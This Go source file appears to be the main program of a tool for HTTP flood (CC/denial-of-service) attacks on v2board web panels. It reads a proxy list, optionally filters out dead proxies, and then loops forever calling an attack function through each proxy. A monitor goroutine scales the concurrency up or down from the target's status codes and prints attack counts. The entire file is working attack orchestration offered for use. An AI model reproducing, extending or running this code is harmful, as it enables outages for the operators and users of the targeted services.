package main

import (
	"fmt"
	"io/ioutil"
	"sync"
	"time"

	"github.com/panjf2000/ants/v2"

	"github.com/thank243/v2board_cc/config"
	"github.com/thank243/v2board_cc/utils"
)

func main() {
	var wg sync.WaitGroup
	buf, err := ioutil.ReadFile("proxies.yaml")
	if err != nil {
		fmt.Println(err)
		return
	}
	r, err := config.UnmarshalRawConfig(buf)
	if err != nil {
		fmt.Println(err)
	}
	pMaps, err := config.ParseProxies(r)
	if err != nil {
		fmt.Println(err)
	}

	var PList []utils.Nodes
	for _, v := range pMaps {
		PList = append(PList, utils.Nodes{Proxy: v})
	}

	counts := 0
	var (
		alivePlist []utils.Nodes
		status     int
	)

	switch config.Cfg.FilterNode {
	case true:
		var current *int
		go func() {
			for {
				if current != nil {
					fmt.Printf("Filter Processing: %.2f%%\n", float32(*current*100)/float32(len(PList)))
					if *current == len(PList)-1 {
						break
					}
					time.Sleep(5 * time.Second)
				}
			}
		}()
		go func() {
			pool, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
				p := i.(utils.Nodes)
				aliveP, _ := utils.URLTest(&p)
				if aliveP.Proxy != nil {
					alivePlist = append(alivePlist, aliveP)
				}
				wg.Done()
			})

			//initial alive proxies
			fmt.Println("Filtering alive nodes")
			for i, p := range PList {
				current = &i
				wg.Add(1)
				err = pool.Invoke(p)
				if err != nil {
					fmt.Println(err.Error())
				}
			}
			pool.Release()
			fmt.Printf("Filter Nodes: %d", len(alivePlist))
		}()
	default:
		alivePlist = PList
	}

	pool2, _ := ants.NewPoolWithFunc(config.Cfg.Connections, func(i interface{}) {
		p := i.(utils.Nodes)
		_ = utils.CCAttack(&p, &counts, &status)
		wg.Done()
	})
	defer pool2.Release()

	//monitor status
	go func() {
		for {
			switch {
			case status == 502 && pool2.Cap() > 24:
				pool2.Tune(pool2.Cap() - 10)
			case status <= 500 && status > 0 && pool2.Cap() < 3*config.Cfg.Connections:
				pool2.Tune(pool2.Cap() + 30)
			}
			fmt.Printf("Total attack: %d [%d nodes] - Current connection: %d - StatusCode: %d\n", counts, len(alivePlist), pool2.Running(), status)
			time.Sleep(5 * time.Second)
		}
	}()

	for {
		if len(alivePlist) > 0 {
			for _, p := range alivePlist {
				wg.Add(1)
				err = pool2.Invoke(p)
				if err != nil {
					fmt.Println(err.Error())
				}
			}
		} else {
			time.Sleep(5 * time.Second)
		}
	}
}
